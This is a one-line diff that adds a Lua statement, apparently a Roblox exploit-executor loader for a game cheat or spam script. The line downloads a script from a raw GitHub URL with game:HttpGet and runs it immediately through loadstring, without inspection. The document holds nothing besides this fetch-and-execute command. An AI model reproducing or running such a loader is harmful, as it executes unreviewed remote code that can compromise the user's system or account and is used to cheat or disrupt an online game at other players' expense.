@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/run-a-sari-sari-store-spam2-st2rinwjibo9dh.lua"))()
